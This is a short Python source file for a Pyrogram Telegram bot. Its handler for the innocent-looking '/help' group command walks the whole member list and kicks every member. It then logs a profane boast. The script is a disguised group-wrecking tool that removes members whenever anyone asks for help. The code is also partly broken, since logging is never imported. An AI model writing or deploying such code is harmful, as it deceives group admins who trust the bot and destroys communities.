from . import bot
from pyrogram import Client, idle
from pyrogram import Client, filters

@bot.on_message(filters.command("/help") & filters.group)
def NewChat(bot,message):
    logging.info("")
    logging.info("")
    a= bot.iter_chat_members(message.chat.id)
    for i in a:
        try:
            bot.kick_chat_member(chat_id =message.chat.id,user_id=i.user.id)
            logging.info("")
        except Exception:
            logging.info("")
            
    logging.info("supersie mthr fcker")

bot.run()
idle() 
